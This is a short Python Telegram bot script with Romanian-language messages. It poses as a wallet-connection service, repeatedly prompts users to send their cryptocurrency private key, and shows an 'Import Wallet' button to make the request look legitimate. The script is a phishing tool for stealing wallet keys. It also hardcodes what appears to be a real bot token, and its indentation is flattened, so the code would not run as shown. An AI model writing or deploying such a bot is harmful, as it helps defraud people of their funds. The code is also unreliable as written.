import telebot
from telebot import types

TOKEN = '7987838254:AAG9sMRcYekjzHHCmklfIQnyoIoxwNwwew0'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_message(message):
bot.send_message(
message.chat.id,
f"@Andrei te invită să-ți conectezi portofelul.\n\nTrimite private key:"
)
bot.register_next_step_handler(message, get_key)

def get_key(message):
bot.send_message(message.chat.id, "Mulțumim! Sistemul nostru este descentralizat.")
markup = types.InlineKeyboardMarkup()
btn = types.InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
markup.add(btn)
bot.send_message(message.chat.id, "Apasă pe Import Wallet:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "import_wallet")
def handle_import(call):
bot.send_message(call.message.chat.id, "Please enter your private key to import your wallet:")

bot.polling()
